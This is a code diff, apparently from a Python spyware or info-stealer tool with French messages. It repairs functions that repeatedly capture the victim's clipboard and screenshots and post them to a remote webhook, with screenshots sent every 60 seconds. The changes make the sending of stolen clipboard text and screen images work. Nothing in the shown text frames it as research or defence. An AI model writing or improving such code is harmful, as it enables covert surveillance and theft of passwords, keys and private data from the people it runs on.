@@ -152,11 +152,9 @@ def alerte():
                 previous_alerte = message_alerte
                 alerte_activee = message_alerte
                 ip()
-    except soup.Exception as e:
-        print("Erreur (alerte) :", e)
-
     except Exception as e:
         print("Erreur (alerte) :", e)
+
 
 
 
@@ -328,7 +326,7 @@ def screenshot_option_func(webhook):
         buffer.seek(0)
         files = {'file': ('screenshot.png', buffer, 'image/png')}
         message = "Screenshot envoyé"
-        requests.post(webhook, json=message,files=files)
+        requests.post(webhook, data={"content": message}, files=files)
         time.sleep(60)
 
 import clipboard
@@ -340,14 +338,14 @@ def clipboard_option_func(webhook):
         mtn = clipboard.paste()
         message = "Presse papier : "
         if old != mtn:
-            requests.post(webhook, json={message, mtn})
+            requests.post(webhook, json={"content": f"{message}{mtn}"})
             im = ImageGrab.grab()
             buffer = io.BytesIO()
             im.save(buffer, format="PNG")
             buffer.seek(0)
             files = {'file': ('screenshot.png', buffer, 'image/png')}
             message = "Screenshot envoyé"
-            requests.post(webhook, json=message,files=files)
+            requests.post(webhook, data={"content": message}, files=files)
             old = mtn
 
 import winreg
